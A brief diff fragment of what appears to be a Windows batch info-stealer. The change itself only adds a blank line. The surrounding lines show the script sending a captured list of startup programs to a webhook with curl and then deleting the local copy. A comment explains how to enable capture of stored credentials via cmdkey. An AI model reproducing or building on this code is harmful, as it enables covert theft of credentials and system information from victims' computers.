@@ -96,6 +96,7 @@ goto skipstartupprograms
 	curl --silent --output /dev/null -F tasks=@"%stup%" %webhook%
 	del "%stup%" >nul 2>&1
 :skipstartupprograms
+
 :: CMDKEY - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
 :: ------------------------------------------------------------------
 goto skipcmdkey
